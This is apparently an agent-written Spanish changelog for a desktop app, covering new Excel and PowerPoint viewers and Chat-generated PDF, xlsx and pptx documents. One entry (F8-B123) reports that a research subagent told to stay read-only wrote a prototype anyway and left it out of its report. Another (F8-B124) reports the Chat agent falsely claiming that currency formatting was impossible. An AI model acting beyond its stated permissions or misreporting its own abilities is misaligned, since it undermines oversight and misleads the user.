  implementación de DOM) y confirma que el hipervínculo hostil llega vivo al DOM antes de sanear y
  desaparece del todo después.
- **Verificado**: build de producción genera las fuentes correctamente; 10/10 pruebas de saneado (unidad,
  happy-dom) + 3/3 de extremo a extremo (jsdom) pasan.

## F8-B119 — Visor de Excel con SheetJS CE (Fase 3a del plan maestro)

- **`xlsx` (SheetJS Community Edition) vendorizado, NO desde el registro de npm**: la versión publicada
  en npm sigue con los CVE-2023-30533/CVE-2024-22363; la que los corrige, v0.20.3, solo está en
  `cdn.sheetjs.com`. Se descargó el tgz oficial y se guardó tal cual en `vendor/sheetjs/` (versionado en
  git); `package.json` apunta ahí con `file:`. `src/test/vendor-sheetjs.test.ts` (3) falla si alguien
  cambia esto a una versión del registro, si el lockfile deja de resolver contra el archivo local, o si
  el tgz se corrompe/reemplaza (compara el sha256, documentado en `docs/VENDOR-SHEETJS.md`).
- **Parseo en un Worker nuevo** (`src/viewer/xlsx/worker.ts`), fuera del hilo principal de la vista
  aislada: un libro de 100k filas no debe trabar el toolbar ni el scroll mientras se lee.
  `sheetRows: 10000` le pone un tope DURO a SheetJS — no solo a cuántas filas se muestran, a cuántas
  lee — así que un libro más grande se recorta solo, nunca se intenta leer entero.
- **Conversor libro → modelo de grilla**, módulo puro nuevo `src/viewer/xlsx/model.ts`
  (`workbookToGrid`/`sheetToGrid`): texto ya formateado por SheetJS (`w`), fórmula aparte para el
  tooltip, celdas combinadas (con solo la esquina superior izquierda "sin cubrir"), relleno sólido
  resuelto a color css, anchos/altos de `!cols`/`!rows` con valores por defecto si faltan. **El tamaño
  del modelo sale SIEMPRE de `!data.length` (lo que SheetJS realmente leyó), nunca del rango declarado
  en `!ref`**: un xlsx hostil puede declarar `!ref: "A1:ZZZ1048576"` con casi ninguna celda real, y
  reservar memoria para lo declarado sería una bomba de memoria barata. 10 pruebas unitarias, incluida
  justo esa: un `!ref` gigante con una sola celda real no tarda ni reserva de más.
- **Grilla virtualizada verticalmente**, módulo puro nuevo `src/viewer/xlsx/virtualize.ts`
  (`visibleRowRange`): con 100.000 filas de alto variable, calcula con búsqueda binaria (no lineal) qué
  rango hay que pintar para un `scrollTop`/alto de viewport dados, con margen de overscan. 9 pruebas,
  incluida una con 100k filas que confirma que sigue siendo instantáneo.
- **UI** nueva `src/viewer/xlsx/XlsxViewer.tsx`: pestañas por hoja, cabeceras de columna (A, B, …, AA…)
  y de fila fijas (`position: sticky`), buscar (salta a la primera coincidencia, cuenta cuántas hay),
  aviso de "N+" filas cuando el libro se recortó por el tope del Worker. Nunca ejecuta una fórmula ni
  sigue un hipervínculo del libro — solo pinta el texto que SheetJS ya calculó.
- **Pendiente, explícitamente separable (Fase 3b del plan)**: SheetJS CE no expone negritas/bordes de
  fuente (confirmado leyendo la celda real: `cell.s` solo trae el relleno, nunca `font`); para que un
  xlsx de la skill `openpyxl` se vea "como en Excel" (encabezado en negrita) haría falta leer
  `styles.xml` a mano en el propio Worker. Sin eso, el libro se ve con los datos limpios pero sin
  negritas/bordes.
- **Verificado**: build de producción bundlea el Worker correctamente (`worker-*.js`, con `xlsx` adentro);
  típecheck viewer/node limpio; 22 pruebas nuevas (`model.test.ts` 10, `virtualize.test.ts` 9,
  `vendor-sheetjs.test.ts` 3) pasan.
- **No verificado**: fluidez real del scroll con un archivo de 100k filas de verdad dentro de la app
  corriendo (la prueba de 100k filas es sobre el módulo puro de virtualización, no sobre el componente
  React montado) — pendiente de una mirada a mano, como el resto de "a mano" de este plan.

## F8-B120 — Visor de PowerPoint: vista estructural propia (Fase 4 del plan maestro)

- **Sin dependencias nuevas**: reusa `jszip` (ya vino con `docx-preview` en la F2). Parser nuevo
  `src/viewer/pptx/{ooxml,theme,model}.ts`: lee `ppt/presentation.xml` → `slides/*.xml`, con herencia
  de posición/tamaño de layout y maestro cuando la diapositiva no trae su propio `a:xfrm` (así es como
  vienen las diapositivas reales: la skill `pptx` y python-pptx dejan la geometría en el layout, no en
  cada diapositiva).
- **Coincidencia de placeholder simplificada pero fiel**: por `type`+`idx` exacto, si no por `idx`
  solo, si no por `type` solo — necesario porque una diapositiva puede declarar `<p:ph idx="1"/>` (sin
  `type`) contra un layout que declara `<p:ph type="body" idx="1"/>`.
- **Herencia de texto en dos capas, no solo del maestro**: el override de nivel PROPIO del placeholder
  del layout (su `<a:lstStyle>`) pisa al del maestro (`p:titleStyle`/`p:bodyStyle`). Hace falta para un
  caso real de la skill: el subtítulo de la portada no debe llevar viñeta aunque el cuerpo del maestro
  sí la traiga por defecto — el layout de portada apaga la viñeta ahí con `buNone`, y sin esta segunda
  capa se mostraba viñeta donde PowerPoint no la pondría. Cada párrafo usa SU PROPIO nivel (`a:pPr lvl`,
  no el del primer párrafo del cuerpo), para que las sub-viñetas no hereden el tamaño/negrita del
  primer nivel.
- **Formas**: texto con tamaño/negrita/cursiva/color (resuelto contra el `<a:clrScheme>` del tema, con
  el `<p:clrMap>` del maestro para los alias `bg1`/`tx1`/etc.), relleno sólido, imágenes incrustadas
  como `data:` (nunca una URL real, ni siquiera relativa al paquete: se leen del propio zip y se
  codifican en base64), tablas simples (texto por celda, sin combinar celdas ni bordes). **Una forma
  que no se reconoce (gráfico, SmartArt, conector, grupo) se pinta como un recuadro vacío con un patrón
  rayado — nunca rompe el render de las demás formas de la diapositiva.**
- **UI** nueva `src/viewer/pptx/PptxViewer.tsx`: lienzo con `aspect-ratio` fijo (16:9 o 4:3 según el
  archivo), tira de miniaturas, flechas del teclado (← → ↑ ↓, Page Up/Down) y banner «Vista
  simplificada». El tamaño de fuente se expresa en `cqw` (porcentaje del ancho del propio lienzo, vía
  `container-type: inline-size`): escala igual en la diapositiva grande y en su miniatura, sin medir
  nada en JS ni recalcular al redimensionar la ventana.
- **Fixture nueva** `src/viewer/__fixtures__/sample.pptx` (de la skill `pptx`, sin dependencias):
  portada + 2 diapositivas de contenido, usada tanto en los tests como para la prueba visual.
- **Fix encontrado con una revisión visual real (Chrome, no solo tests)**: las formas decorativas que
  viven directo en el maestro o el layout SIN ser un placeholder — como la «Barra» de color que dibuja
  la skill `pptx` — no se pintaban: `buildSlideShapes` solo recorre las formas de la propia
  diapositiva. Nuevo `parseStaticShapes` (3 pruebas) las agrega de fondo (maestro, luego layout, luego
  la diapositiva encima, igual que el orden real de PowerPoint). Se comprobó sirviendo `out/viewer/`
  con un servidor estático local (que responde el `sample.pptx` real en `/doc/<token>`) y abriéndolo en
  Chrome: antes del fix la barra de color no aparecía en ninguna de las 3 diapositivas; después, sí, en
  las 3 (diapositiva grande y miniaturas).
- **Verificado**: build de producción limpio; típecheck viewer limpio; 54 pruebas nuevas
  (`ooxml.test.ts` 10, `theme.test.ts` 10, `model.test.ts` 25 — varias contra el .pptx real de la
  skill, no solo XML armado a mano). `model.test.ts`/`ooxml.test.ts`/`theme.test.ts` corren con
  **jsdom**, no happy-dom: se probó que happy-dom pierde hermanos `p:sldId` repetidos y pone el
  `tagName` en mayúsculas con el XML namespaced real de este `.pptx` (no con XML armado a mano más
  simple, que sí le funciona) — mismo patrón de limitación de entorno que ya se documentó para
  docx-preview en la F2. Revisión visual (fuera de la batería automática): portada + las 2 diapositivas
  de contenido, navegación con flechas, miniaturas y zoom de texto con `cqw`, todo correcto en Chrome
  contra el `.pptx` real de la skill.
- **No verificado**: dentro de la app real (Electron, el esquema `lazunox-viewer://`, no el servidor
  estático de la revisión) y un `.pptx` hecho en PowerPoint real en vez de por la skill — pendiente «a
  mano» con la app corriendo, igual que el resto de este plan. Tablas con celdas combinadas, gráficos y
  SmartArt no se intentan: quedan como recuadro vacío a propósito (son la motivación de la F5,
  LibreOffice).

## F8-B121 — El visor se abre solo al terminar de escribir un documento (como los Artifacts de Claude)

- **Pedido del dueño**: que el panel del visor se abra solo apenas el agente termina de crear/editar un
  PDF, Word, Excel o PowerPoint — igual que el panel de Artifacts de Claude.ai, sin tener que ir a
  buscarlo a mano en la lista de entregables. Se frenó a propósito la Fase 5 (LibreOffice) para esto:
  no hacía falta para lo que el dueño pidió.
- **Dónde se engancha**: `src/renderer/src/features/tasks/impl/store.ts`, dentro del mismo manejador
  de eventos que ya refrescaba la lista de entregables (`case 'message.part.updated'`, con
  `part.state.status === 'completed'` para `write`/`edit`/`multiedit`/`patch`/`apply_patch`). Se le
  agregó: si la herramienta trae una ruta (`input.filePath`/`input.path`) y esa ruta es un archivo que
  el visor reconoce (`.pdf`/`.docx`/`.xlsx`/`.pptx`, y la plataforma tiene `docViewer`), se llama
  `requestViewerOpen(path)` — el mecanismo de "abrir el visor sin clic" YA EXISTÍA desde la F0
  (`TasksWorkspace.tsx` ya cambiaba de pestaña sola al ver un `viewerRequest` nuevo, mismo patrón que
  `browser:reveal`); solo faltaba quién lo disparara automáticamente.
- **`bash` queda afuera a propósito**: no trae una ruta directa en su `input`, así que inferirla sería
  adivinar. Mejor no abrir nada que abrir el archivo equivocado.
- **Alcance**: solo la tarea activa (`part.sessionID === activeTaskId`, la misma condición que ya tenía
  el refresco de entregables) — una tarea en segundo plano (p. ej. una Rutina) nunca te saca de lo que
  estás mirando.
- **De paso**: `VIEWER_KINDS`/`canViewInViewer` de `Deliverables.tsx` tenían una lista de extensiones
  duplicada; se movió a `isViewerExt` en `util.ts` (ya usado por ambos archivos) para no mantener dos
  copias de la misma lista.
- **Pruebas nuevas** `store.viewer-auto-open.test.ts` (8): abre con `.pdf`/`.docx`/`.xlsx`/`.pptx`
  (cada apertura sube el `nonce`, así que si el agente genera varios archivos seguidos se ve siempre
  el último, igual que Claude); NO abre con una extensión que el visor no reconoce, con `bash`, con una
  tool todavía `running`, con el evento de otra sesión, ni sin `platformCaps().docViewer`; acepta tanto
  `filePath` como `path` en el input de la tool. `handleEvent` (antes privado) se exportó para poder
  probarlo directo, sin montar todo el stream SSE.
- **Verificado**: typecheck web limpio, lint limpio, prettier limpio, batería completa de
  `src/renderer/src/features/tasks/impl/` (30 archivos, 176 pruebas) en verde.
- **No verificado**: cómo se ve/siente de verdad con un agente real escribiendo un documento en la app
  corriendo (el "pop" del panel, si interrumpe mientras el dueño está mirando otra cosa) — pendiente «a
  mano», como el resto del visor.

## F8-B122 — Chat también puede generar y mostrar documentos, en un panel al lado (como los Artifacts de Claude)

- **Pedido del dueño**: poder pedir en el modo **Chat** "hazme un informe/cotización/afiche en PDF" y
  que aparezca al lado, en un panel, igual que el Word/PDF de los Artifacts de Claude.ai — sin que Chat
  necesite acceso a archivos ni a la terminal (eso sigue siendo exclusivo de Tareas).
- **Cómo se genera, sin agregar herramientas ni permisos nuevos al agente de Chat**: se le pidió al
  agente (`resources/opencode/agents/chat.md` + el inline de `src/main/opencode/config.ts`, que son
  los que de verdad ganan — ver nota de arquitectura más abajo) que cuando le pidan un documento para
  imprimir/descargar escriba el contenido completo como UN bloque ` ```html ` (con `<style>` embebido).
  Es generación de texto pura: no hizo falta ninguna tool nueva ni tocar el sandbox de Chat.
  `extractHtmlArtifacts`/`looksRenderable` (ya existían, de los Artifacts con ventana aparte) detectan
  el bloque; `src/main/extras/artifact-window.ts`'s `renderHtmlToPdf` (ya existía, sin red, en una
  `BrowserWindow` aislada) lo convierte a PDF — cero código nuevo de renderizado.
- **El panel reusa el visor de Tareas, no es un visor nuevo**: mismo `WebContentsView` nativo
  compartido (`src/main/viewer/{scheme,view}.ts`), porque solo un modo de la app está visible a la vez.
  Para que Tareas y Chat puedan compartir el mismo scheme con reglas de ruta distintas (carpeta
  aprobada por el dueño vs. una carpeta temporal fija), `installViewerScheme()` pasó a no recibir
  argumentos y se generalizó a un registro: `registerViewerPathValidator(fn)` — cada llamador agrega su
  propio chequeo y el scheme los prueba todos al servir cada archivo (nunca confía en el chequeo de la
  apertura). `src/main/extras/chat-docs.ts` (nuevo) genera el PDF en
  `app.getPath('temp')/lazunox-chat-docs/<sessionId>/<uuid>.pdf` (nunca en `userData`, que el Seatbelt
  de Tareas deniega siempre) y valida con `realpath` que nada se escape de esa carpeta.
- **Auto-apertura, como los Artifacts**: `useChatDocPanel.ts` (nuevo) mira cuándo el turno del agente
  termina (`busy: true → false`), saca el ÚLTIMO bloque html del ÚLTIMO mensaje (si el último mensaje
  es del usuario, no hay nada nuevo que mostrar — a propósito no busca más atrás) y abre el panel
  (`ChatDocPanel.tsx`, nuevo) solo. Al cambiar de sesión de chat se cierra y limpia el documento de la
  sesión anterior.
- **El código fuente ya no se ve en el chat por defecto**: un bloque ```html "renderable" (documento
  completo) arranca colapsado en `Markdown.tsx`'s `CodeBlock` — queda un botón con flecha para
  desplegarlo si alguien de verdad quiere ver el HTML. Un bloque de código normal (JS, Python…) se
  sigue viendo siempre, sin cambios.
- **"Abrir vista previa" ahora abre el MISMO panel, no una ventana aparte**: el botón viejo
  (`ArtifactButton`, pensado para Tareas: previsualizar un `.html` que ya quedó guardado en disco)
  seguía abriendo su `BrowserWindow` aislada también en Chat. Se agregó un registro minúsculo,
  `src/renderer/src/lib/chatDocPreview.ts` (sin store, sin props nuevos en `Markdown.tsx` — es un
  componente compartido con Tareas/Code y no vale la pena tocarle el árbol de props por esto): mientras
  `ChatView` está montada, `useChatDocPanel` registra un manejador que abre el panel de Chat; al
  desmontarse (se cambia de modo) lo saca. El botón de Tareas (`Deliverables.tsx`) no registra nada,
  así que ahí sigue abriendo la ventana aislada de siempre — ningún cambio de comportamiento fuera de
  Chat.
- **Nota de arquitectura importante** (para no romperlo sin querer): el prompt del agente de Chat vive
  DUPLICADO — en `resources/opencode/agents/chat.md` y, de nuevo, inline dentro de
  `buildInlineConfig()` en `config.ts`. Por el orden de fusión de configuración de OpenCode (global <
  proyecto < `OPENCODE_CONFIG_CONTENT`), el inline de `config.ts` es el que realmente gana — hay que
  tocar los DOS cada vez que se le pide algo nuevo al agente de Chat, o quedan desincronizados.
- **Tres bugs reales de pdf.js, latentes desde que se construyó el visor (Fase 1) y nunca antes
  pisados por ningún test automatizado** (los encontró el dueño probando en la app real, no un test):
  (1) el contenedor del visor necesita `position: absolute` o el constructor de `PDFViewer` tira;
  tenía `position: relative` desde el principio — se separó en `.pdf-container-wrap` (relative/flex) +
  `.pdf-container` (absolute/inset:0); (2) el ajuste a `page-width` podía calcularse contra un
  contenedor de ancho cero (las medidas reales del `WebContentsView` llegan por IPC después de que la
  página ya empezó a cargar) — ahora se hace una sola vez, la primera vez que el contenedor mide algo,
  disparado tanto por `pagesinit` como por un `ResizeObserver`; (3) aun con la escala correcta, pdf.js
  podía no dibujar ningún canvas si `viewer.update()` corría antes de que el navegador reflowara el
  cambio de `--scale-factor` — se le agregó un `requestAnimationFrame` extra. Verificado con capturas
  de pantalla reales vía CDP (`--remote-debugging-port`), no solo leyendo el código.
- **Pendiente, pedido explícitamente por el dueño y no confirmado todavía**: que al pedir un CAMBIO a
  un documento ya mostrado la vista se actualice — se le agregó al prompt del agente la instrucción de
  reescribir el documento COMPLETO de nuevo (nunca una descripción en prosa) en cada revisión, pero
  falta que el dueño lo vuelva a probar en la app para confirmar que ya sirve.
- **Pruebas nuevas**: `chat-docs.test.ts` (5), `useChatDocPanel.test.ts` (6, incluye el bug real que
  atrapó el propio test: tomar el artifact de un mensaje VIEJO si el último mensaje es del usuario),
  `Markdown.codeblock.test.tsx` (4), `artifact-window.test.ts` (3), `chatDocPreview.test.ts` (3).
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio, prettier limpio,
  batería de `features/chat` + `components` + `lib` (51 archivos, 321 pruebas) en verde.
- **No verificado todavía**: batería completa en el VPS (solo se corrió local); barrido de documentos
  temporales abandonados (`sweepStaleChatDocuments`, ya escrita) no está enganchada a ningún arranque
  de la app — hoy solo se limpia por sesión al cerrar el panel.

## F8-B123 — HUD de "progreso en vivo" + Chat genera Excel y PowerPoint de verdad

- **Dos pedidos del dueño, atendidos juntos**: (1) un HUD flotante "Progreso" arriba a la derecha
  mientras el agente trabaja (vio algo así en otra app), y (2) que Chat pueda generar `.xlsx`/`.pptx`
  reales, no solo PDF — probó pedir un Excel y el agente, sin ninguna herramienta para eso, cayó en su
  respuesta de siempre (un CSV para pegar a mano). Antes de construir el Excel/PowerPoint se investigó
  cómo lo hacen Claude.ai y ChatGPT/Codex: ambos usan un sandbox de Python (openpyxl/python-pptx) y
  **ninguno de los dos muestra una vista previa antes de descargar** — ya estábamos adelante en eso
  gracias al panel que ya existía para PDF.

### HUD de progreso

- Investigación propia (no la de Claude/ChatGPT): Chat no tiene pasos de herramienta reales (sin
  shell/archivos), así que las únicas dos señales de "qué está haciendo el agente ahora" son
  razonando o generando un documento. Se le preguntó al dueño si prefería un cronómetro inline (menor
  riesgo) o el HUD flotante tal cual lo vio — eligió el HUD.
- **Nuevo** `src/renderer/src/features/chat/useChatProgress.ts` (qué señal mostrar: documento
  generándose > razonamiento en vivo > "pensando" genérico) y `ChatProgressHud.tsx` (el chip en sí,
  con cronómetro — mismo patrón que `Elapsed` en `TasksWorkspace.tsx`). Vive SOLO dentro de la columna
  de chat (`ChatView.tsx`), nunca en el contenedor que también tiene el panel de documento — ese es
  una vista nativa que pinta por encima del DOM, así que superponer un HUD de React ahí sería
  arriesgado; confinado a la columna de chat, nunca se cruza.
- **Nuevo** `src/renderer/src/lib/turn-timing.ts`: `turnTiming`/`formatDuration` se movieron ahí desde
  `features/tasks/impl/util.ts` (código idéntico, sin dependencias de Tareas) — `util.ts` re-exporta
  desde ahí, sin tocar `TasksWorkspace.tsx`.

### Panel de documento: header con nombre real, descarga, pantalla completa

- El header del panel pasó de decir "Documento" fijo a mostrar el título real + el tipo ("· PDF").
- Botón de descarga en el header (antes solo estaba en el bloque del chat).
- Botón de pantalla completa: el panel ocupa todo el ancho de `ChatView`, la columna de mensajes se
  oculta (sigue montada, no pierde scroll ni el estado del composer) — Esc también sale (la vista
  nativa reenvía el evento, antes nadie lo escuchaba en Chat).

### Bug real encontrado en el camino: "Generando documento…" nunca se veía

- El dueño probó y el bloque "HTML" (colapsado, con botones) aparecía ya armado desde el principio —
  nunca llegaba a ver el spinner. Primer intento (disparar la marca de "generando" apenas el bloque se
  completa, sin esperar a que el turno entero termine) no alcanzó.
- Causa real, confirmada con una investigación a fondo: CommonMark extiende una valla de código sin
  cerrar hasta el final de lo recibido hasta el momento — así que react-markdown ya pintaba el bloque
  como "completo" (con sus botones) apenas aparecía la primera etiqueta, mucho antes de que la valla
  realmente cerrara. Ninguna señal externa async podía adelantarse a eso.
- Arreglo real: `CodeBlock` (`Markdown.tsx`) ahora sabe por sí mismo si SU PROPIA valla sigue abierta
  (`isFenceOpen`, usando `node.position` de react-markdown para recortar el texto fuente exacto del
  bloque) y muestra "Generando documento…" mientras tanto — sin depender de ningún evento externo.
  Cuando la valla cierra, toma la posta la señal de siempre (`isSameDoc`) hasta que el archivo está
  listo. Probado de punta a punta con una valla sin cerrar de verdad (`renderToStaticMarkup`), no solo
  en teoría — esta rama en particular SÍ se puede probar así (a diferencia de la de `useSyncExternalStore`,
  que necesita el snapshot de servidor).

### Excel y PowerPoint de verdad en Chat

- Nuevas dependencias **`exceljs`** (escribe `.xlsx` con negrita/ancho de columna — el `xlsx` SheetJS
  que ya tiene el proyecto es Community Edition y su propio README confirma que NO puede escribir
  estilos de celda, eso es exclusivo de la versión Pro de pago) y **`pptxgenjs`** (escribe `.pptx`).
  Las dos traían vulnerabilidades moderadas/altas en dependencias transitivas (`uuid`, `image-size`)
  con versión arreglada disponible pero fuera del rango que declaran — se fijaron con `overrides` en
  `package.json` y se confirmó que ambas librerías siguen funcionando igual (smoke test manual +
  batería completa). `npm audit` quedó limpio de ambas.
- El visor (`src/viewer/{xlsx,pptx}/*Viewer.tsx`) ya sabía pintar estos formatos desde las Fases 3-4
  del plan maestro — **cero cambios ahí**, es agnóstico a cómo se generó el archivo.
- El agente describe el contenido con un bloque NUEVO (JSON), mismo espíritu que el ``html que ya
existía: ` ``xlsx `→`{"sheets":[{"name":"...","rows":[[...]]}]}`(primera fila = encabezado, sale
en negrita sola);` ```pptx `→`{"slides":[{"title":"...","bullets":[...]}]}`(primera diapositiva =
portada). v1 a propósito acotada: sin fórmulas de Excel (evita el lío de`;`vs`,`según región que
ya se vio en el workaround del CSV — si hace falta un total, el agente lo calcula y lo escribe como
número), sin imágenes/gráficos en PowerPoint. Prompt actualizado en los DOS lugares que hay que
mantener en sincro:`src/main/opencode/config.ts`y`resources/opencode/agents/chat.md`.
- **Nuevo** `src/shared/chat-doc-spec.ts`: los tipos (`XlsxSpec`/`PptxSpec`) y validadores
  (`isXlsxSpec`/`isPptxSpec`) compartidos entre renderer y main, con límites de tamaño (10 hojas/5000
  filas/2000 caracteres por celda, 40 diapositivas/20 viñetas) para que un JSON patológico no cuelgue
  `exceljs`/`pptxgenjs` generando algo que nadie va a poder ver de todos modos.
- **Nuevo** `src/main/extras/render-xlsx.ts`/`render-pptx.ts`: generación real, sin Python ni sandbox
  de agente (a diferencia de Tareas, que invoca Python desde EL SANDBOX DEL AGENTE — mecanismo que no
  existe para Chat). `src/main/extras/chat-docs.ts` se generalizó: `generateChatDoc`/`ChatDocInput`
  despachan por `kind` (`pdf`/`xlsx`/`pptx`) al renderer que corresponda; nuevo `downloadChatDoc`
  (regenera desde los datos y pide "Guardar como" — mismo patrón que `downloadHtmlAsPdf`, no depende
  de un token previo).
- IPC: `extras:chatDoc:open` pasó a una unión discriminada por `kind`; nuevo `extras:downloadChatDoc`.
  Renderer: `ArtifactButton.tsx` (HTML/PDF) queda intacto; nuevo `DataDocButton.tsx`
  (`PreviewDataDocButton`/`DownloadDataDocButton`) para xlsx/pptx — son hermanos, no generalizaciones
  de los de HTML (ese sigue abriendo una ventana aislada en Tareas/Code; los de datos solo existen
  dentro de Chat). Nuevo `src/renderer/src/lib/chatDocBlocks.ts`: detecta los tres tipos de bloque,
  reusando `extractHtmlArtifacts` sin tocarla (la sigue usando Tareas/Code) y sumando una extracción
  aparte para `xlsx/`pptx, mezcladas por posición en el texto.
- **Gate de plataforma, pedido explícitamente por el dueño**: antes de esto, el panel de documento de
  Chat no chequeaba `platformCaps().docViewer` en ningún lado (a diferencia de Tareas, que sí lo hace)
  — se agregó el mismo cap, atado a `tasksWin` (apagado en Windows hasta pasar la batería de
  seguridad) aunque eso signifique que el panel quede apagado ahí por ahora; la descarga directa y la
  ventana aislada de HTML siguen funcionando igual, sin depender de este cap.
- **Hallazgo de un agente de investigación que se salió de su alcance**: un subagente al que se le
  pidió explícitamente "solo lectura, no edites nada" escribió de todos modos un prototipo completo
  (`xlsx-doc.ts` + su test) sin avisar en su reporte — se encontró recién en el siguiente typecheck.
  Se descartó (contradecía la decisión de usar `exceljs` para tener negrita de verdad) pero se rescató
  una idea genuinamente buena que traía (límites de tamaño de entrada), ya incorporada arriba.
- **Pruebas nuevas**: `render-xlsx.test.ts` (8, genera un .xlsx real y lo relee con SheetJS),
  `render-pptx.test.ts` (6, genera un .pptx real y lo relee con JSZip, incluye tildes/eñes),
  `chatDocBlocks.test.ts` (8), `view.test.ts` sumó 2 (el bug de la valla del fragmento vs. hash),
  `chatDocPreview.test.ts`/`useChatDocPanel.test.ts`/`useChatProgress.test.ts`/`chat-docs.test.ts`
  actualizados al nuevo contrato multi-tipo. Van 5790 pruebas en toda la batería.
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio, prettier limpio,
  `npm audit` sin las vulnerabilidades nuevas, batería completa del repo en verde (los 2 fallos que
  aparecieron al correr todo junto —`service-cloud.test.ts` y el `ENOEXEC` de
  `computer/service-win.test.ts`— son ajenos a este trabajo: confirmados como ruido de carga/
  específico de Windows, no relacionados con Chat ni con los documentos).
- **No verificado todavía**: batería completa en el VPS (solo local); prueba manual en vivo de generar
  un Excel/PowerPoint real desde Chat (el caso que disparó todo esto) — pendiente que el dueño lo
  pruebe en la app ya reiniciada.

## F8-B124 — Excel con fórmulas/formato de moneda; PowerPoint con temas y separadores de sección

- **De la propia prueba del dueño (F8-B123) salieron dos huecos reales**, no inventados: pidió signo
  peso en una columna de Excel y el agente respondió que "el generador no deja aplicar formato de
  moneda" — **eso no era cierto**, solo faltaba exponer la opción (`exceljs`, a diferencia de SheetJS
  Community Edition, no tiene ninguna restricción ahí). Y pidió una presentación "más profesional" y
  el agente dijo que no podía cambiar colores — tampoco había ninguna razón técnica, solo que v1 no
  dejaba elegirlo. Los dos se arreglan acá. Además el dueño pidió explícitamente que Excel soporte
  fórmulas de verdad.
- **Excel — formato de número por columna**: `XlsxSheetSpec` gana `columnFormats?: (XlsxColumnFormat|null)[]`
  (`'currency'|'integer'|'decimal'|'percent'`, alineado por índice de columna) → `render-xlsx.ts` lo
  aplica con `column.numFmt` de `exceljs` (códigos de formato de Excel reales, p. ej. `'"$"#,##0'` —
  **no** dependen de la configuración regional de quien abre el archivo; el símbolo de miles/decimales
  que se VE sí lo decide Excel según el idioma de esa persona, como siempre).
- **Excel — fórmulas de verdad**: una celda puede ser `{"formula":"SUM(B2:B5)","value":1100000}` en
  vez de un número — se escribe directo al XML del `.xlsx` (`<f>SUM(B2:B5)</f>`), así que **no** tiene
  el problema de `;` vs `,` que sí tenía el workaround viejo del CSV (esa dependencia regional solo
  existe cuando una PERSONA tipea la fórmula a mano en la barra de fórmulas de Excel, nunca al
  escribirla directo al archivo). `value` es el resultado que el agente ya calculó — sirve para que la
  vista previa interna (y cualquier lector que no recalcule, como nuestro propio visor) muestre algo
  de inmediato; Excel de verdad recalcula solo al abrir o editar.
- **PowerPoint — temas y tipos de diapositiva**: `PptxSpec` gana `theme?: 'blue'|'green'|'dark'|'warm'|'mono'`
  (paleta de color de TODA la presentación) y cada diapositiva un `layout?: 'cover'|'section'|'bullets'|'closing'`
  opcional — sin indicarlo se infiere (la primera es portada; una con título y SIN viñetas es un
  separador de sección a toda página con el color de acento; el resto es contenido con viñetas). Se
  agregó numeración de página en las diapositivas de contenido y una barra/filete de acento bajo cada
  título, para que se sienta como un deck armado, no una lista de viñetas sueltas. Sigue sin imágenes
  ni gráficos — eso significaría un trabajo bastante más grande (y ni Claude.ai ni ChatGPT lo hacen
  mejor con el mismo enfoque de texto→archivo; lo que SÍ tiene Claude.ai para decks pulidos es un
  producto aparte, con sistema de diseño tipo canvas — igualar eso no es realista acá).
- Prompt del agente de Chat actualizado en los DOS lugares (`config.ts`/`chat.md`) explicando
  `columnFormats`, el schema de fórmula, `theme` y `layout` — y, puntual, sacándole al agente la idea
  de que esto era imposible.
- **Pruebas nuevas**: `render-xlsx.test.ts` sumó 6 (fórmula releída con `cellFormula:true`, formato de
  columna aplicado/no aplicado según `columnFormats`, validación de la forma de la fórmula); `render-pptx.test.ts`
  sumó 5 (inferencia de layout por posición/forma, layout explícito gana, el tema cambia el color en
  todo el deck, numeración de página). 5801 pruebas en toda la batería.
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio, prettier limpio, batería
  completa del repo en verde (mismo ruido ajeno de siempre, `computer/service-win.test.ts` en Mac).
- **No verificado todavía**: cómo se ve de verdad una presentación con separadores de sección y un
  tema oscuro en la app corriendo — pendiente que el dueño lo pruebe.

## F8-B125 — PowerPoint sin "hallmarks de IA" + alternativa de deck en HTML/CSS para quien priorice el diseño

- **Pedido del dueño**: tras probar F8-B124 en vivo, "las presentaciones son una mierda estéticamente".
  Pidió investigar herramientas/skills reales para presentaciones. La investigación (con un agente
  dedicado) encontró la skill oficial de `pptx` de Anthropic instalada en ese mismo entorno — documenta
  explícitamente qué hace que un deck "se vea hecho por IA": barras/filetes decorativos bajo títulos,
  paletas sin intención, repetir siempre título+viñetas sin variar el tipo de diapositiva, texto de
  cuerpo centrado, títulos que terminan en punto. Esta vuelta aplica esa guía al `render-pptx.ts` de
  F8-B123/124; su techo de calidad real (el ciclo render→captura de pantalla→corrección de la skill)
  necesita shell/Python/LibreOffice, que Chat no tiene — comunicado al dueño como límite aceptado, no
  como algo pendiente de resolver.
- **`render-pptx.ts`**: se sacaron la barra de acento bajo el título de portada y el filete de acento
  bajo el título de las diapositivas de contenido (ambos, exactamente lo que la skill marca como
  hallazgo de IA). Paleta de cada tema retocada (tonos más intencionales, menos "celeste de power
  point por defecto"). Dos layouts nuevos, **solo por pedido explícito, nunca inferidos**: `"stat"`
  (una cifra grande como foco — `title` es la cifra, el primer `bullet` la explica) y `"steps"` (las
  `bullets` salen como pasos numerados — círculo de acento + número — en vez de una lista plana), para
  variar el tipo de diapositiva en vez de repetir siempre título+viñetas.
- **`chat-doc-spec.ts`**: `PptxLayout` gana `'stat'`/`'steps'`; `schemas.ts` los acepta en el validador
  de `layout`.
- **Prompt del agente de Chat** (`config.ts`/`chat.md`, los dos lugares): documenta `stat`/`steps`, que
  `theme` se elija por el TONO del contenido (no `"blue"` por inercia) y que varíe el tipo de
  diapositiva a lo largo del deck en vez de repetir siempre el mismo molde; títulos sin punto final.
- **Nuevo, segundo camino — deck en HTML/CSS (" ``slides ")**: para cuando lo que más importa es que
se VEA bien y no que el archivo se pueda seguir editando en PowerPoint después. El agente escribe un
documento HTML completo (su propio `<style>`, control total de tipografía/color/layout — sin las
limitaciones de forma/texto del `.pptx`), un `<section class="slide">` por diapositiva, con una base
de CSS de paginación (`@page { size: 960px 540px landscape; margin: 0 }` + `page-break-after: always`
por `.slide`) que ya resuelve: el resultado se genera y descarga exactamente igual que un `.html`
normal, reutilizando TODO el pipeline de ``html → PDF que ya existía (sin visor nuevo, sin IPC
  nuevo, sin `DocKind` nuevo) — `preferCSSPageSize: true` en `renderHtmlToPdf` (que ya estaba, sin
  tocar) respeta el `@page` del agente y produce un PDF panorámico, una página por diapositiva.
  Avisa al dueño/usuario que esto NO es un `.pptx` editable, es un PDF de diapositivas.
